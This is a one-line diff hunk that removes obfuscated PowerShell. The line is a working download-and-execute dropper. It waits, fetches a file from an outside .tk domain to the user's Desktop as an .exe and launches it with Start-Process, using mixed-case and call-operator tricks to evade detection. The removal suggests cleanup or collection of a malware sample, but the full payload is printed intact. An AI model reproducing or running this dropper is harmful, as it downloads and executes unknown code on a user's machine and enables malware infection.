@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoaDFilE.iNVoKE('https://microratings.tk/videos','$Des\7334492.exe');&'Start-Process' $Des\7334492.exe
